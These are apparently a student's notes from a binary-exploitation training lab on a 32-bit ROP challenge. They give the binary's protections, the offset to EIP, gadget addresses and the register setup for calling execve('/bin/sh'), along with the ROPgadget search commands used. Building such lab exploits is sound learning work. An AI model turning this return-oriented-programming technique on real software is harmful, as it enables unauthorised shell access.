# info

```
[*] '/home/roy4801/Desktop/myLecture/20191225_training_pwn0x02/lab/rop1/tmp/rop1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

# note

76 = eip

# gad

execve("/bin/sh", NULL, NULL)
eax=0x0b
ebx=-> "/bin/sh"
ecx = edx = 0

0x080a8c56 : pop eax ; ret
0x080481c9 : pop ebx ; ret
0x0806f041 : xor ecx, ecx ; int 0x80
0x0806ec7b : pop edx ; ret

0x08056d35 : mov dword ptr [edx], eax ; ret

> rg "mov dword ptr \[e.x\]" gad

> 0x0a = '\n' so gets() fucked up

# steps

ROPgadget --binary ./rop1 > gad

rg "pop e.x" gad
rg "mov dword ptr \[e.x\]" gad
